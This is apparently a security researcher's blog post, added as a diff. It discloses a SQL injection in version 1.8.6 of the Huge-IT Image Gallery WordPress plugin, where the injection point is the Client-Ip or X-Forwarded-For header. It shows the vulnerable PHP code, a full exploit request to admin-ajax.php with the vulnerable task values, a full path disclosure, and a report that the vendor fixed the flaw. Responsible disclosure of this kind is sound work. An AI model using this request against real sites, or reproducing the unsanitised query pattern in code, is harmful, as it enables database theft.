@@ -1,0 +1,102 @@
+<p>While I was working on a famous bug bounty program, WPScan returns me the list of the plugins configured on the Wordpress install.
+Here is what I found in one of them: <a href="https://wordpress.org/plugins/gallery-images/" class="flashlink" target="_blank">Image Gallery by Huge-IT</a>.</p>
+
+<p>WPScan output, no issues known:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[+] Name: gallery-images - v1.8.6  
+ |  Location: https://[REDACTED]/wp-content/plugins/gallery-images/  
+ |  Readme: https://[REDACTED]/wp-content/plugins/gallery-images/readme.txt  
+</code></pre>
+</div>
+
+<p>After a fast search on <a href="https://www.exploit-db.com/" target="_blank">exploit-db.com</a> with no success, I finally decided to download it and read the code to find vulnerabilites by myself.
+Since the readme was awailable, I was able to confirm the version of the plugin.</p>
+
+<p>I was looking for two kind of vulnerabilities: file upload and sql injection.
+First thing I did was to locate PHP files, and grepping the result to find <code class="highlighter-rouge">Content-Disposition</code> header:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>find . -name <span class="s2">"*.php*"</span> | xargs grep -i header
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:		/<span class="k">*</span>HEIGHT FROM HEADER.PHP<span class="k">*</span>/
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./Front_end/gallery_front_end_view.php:							header<span class="o">(</span><span class="s2">"Location:"</span>.<span class="nv">$actual_link</span>.<span class="s2">""</span><span class="o">)</span>;
+./admin/gallery_func.php:			header<span class="o">(</span><span class="s1">'Location: admin.php?page=gallerys_huge_it_gallery&amp;id='</span>.<span class="nv">$rowsldccs</span>-&gt;id.<span class="s1">'&amp;task=apply'</span><span class="o">)</span>;
+./admin/gallery_view.php:	header<span class="o">(</span><span class="s1">'Location: admin.php?page=gallerys_huge_it_gallery&amp;id='</span>.<span class="nv">$row</span>-&gt;id.<span class="s1">'&amp;task=apply'</span><span class="o">)</span>;
+./admin/gallery_view.php:	&lt;div <span class="nv">id</span><span class="o">=</span><span class="s2">"gallery-header"</span>&gt;
+</code></pre>
+</div>
+<!--more-->
+
+<p>Nothing interesting here…</p>
+
+<p>Then, I noticed that the “non admin” requests where mainly coded in two files: <code class="highlighter-rouge">gallery-images.php</code> and <code class="highlighter-rouge">Front_end/gallery_front_end_view.php</code>.
+Luckily I started to read the first one which contains the hole.</p>
+
+<p>In the function <code class="highlighter-rouge">huge_it_image_gallery_ajax_callback</code>, the variable <code class="highlighter-rouge">$huge_it_ip</code> is used multiple times in the following form:</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>$wpdb-&gt;prepare("SELECT `image_status`,`ip` FROM ".$wpdb-&gt;prefix."huge_itgallery_like_dislike WHERE image_id = %d AND `ip` = '".$huge_it_ip."'",(int)$row-&gt;id);
+</code></pre>
+</div>
+
+<p>This variable is defined at the top of the file:</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+	$huge_it_ip=$_SERVER['HTTP_CLIENT_IP'];
+}
+elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+	$huge_it_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+else{
+	$huge_it_ip=$_SERVER['REMOTE_ADDR'];
+}
+</code></pre>
+</div>
+
+<p>Unfortunately HTTP headers cannot be trusted, even ip address.
+So I started to test the injection in <code class="highlighter-rouge">X-Forwarded-For</code> header and it worked perfectly on my local install.
+However the site I was testing seems to had a firewall who drop this header. 
+I then tested the injection in <code class="highlighter-rouge">Client-Ip</code> header and it passed !</p>
+
+<p>Note that the plugin must be enabled to be able to exploit the injection.
+Finally here is the full request in Burp Suite:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: local.wordpress.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.8.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://local.wordpress.com/wp-admin/admin.php?page=gallerys_huge_it_gallery&amp;task=edit_cat&amp;id=1
+Content-Length: 89
+Client-Ip: 123.123.123.123
+Cookie: wordpress_3e0ed6e299d95d3a38b8516e25f1b1e2=admin%7C1463913228%7CYRWrxl5s69SoSkkXyMBFnXzSt2dSINk63ojC6F0mcWJ%7Cb28be90ae8a75452f047cb21fcc84f42a9a801123af24c1f77bb3f19c880147b; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_3e0ed6e299d95d3a38b8516e25f1b1e2=admin%7C1463913228%7CYRWrxl5s69SoSkkXyMBFnXzSt2dSINk63ojC6F0mcWJ%7C243730f21ebdc724e25dd292d6c8d1773510dd572a0a39abc88b379852181f1f; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wp-settings-time-1=1463740430; PHPSESSID=e5a63r274m6mvcfbmblgacrvq0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+action=huge_it_video_gallery_ajax&amp;task=load_images_content&amp;galleryid=1&amp;page=1&amp;perpage=100
+</code></pre>
+</div>
+
+<p>The parameter <code class="highlighter-rouge">task</code> can be one of the following:<br />
+load_images_content<br />
+load_images_lightbox<br />
+load_image_justified<br />
+load_image_thumbnail<br />
+load_blog_view</p>
+
+<p>And the result:
+<a href="/images/image-gallery-sql-injection.png"><img src="/images/image-gallery-sql-injection.png" alt="sqlmap injection" /></a></p>
+
+<p>A Full Path Disclosure is also available if you call <code class="highlighter-rouge">http://www.example.com/wp-content/plugins/gallery-images/gallery-images.php</code></p>
+
+<p>I sent an email to Huge-IT who released a fix the same day. Fast enough :)</p>
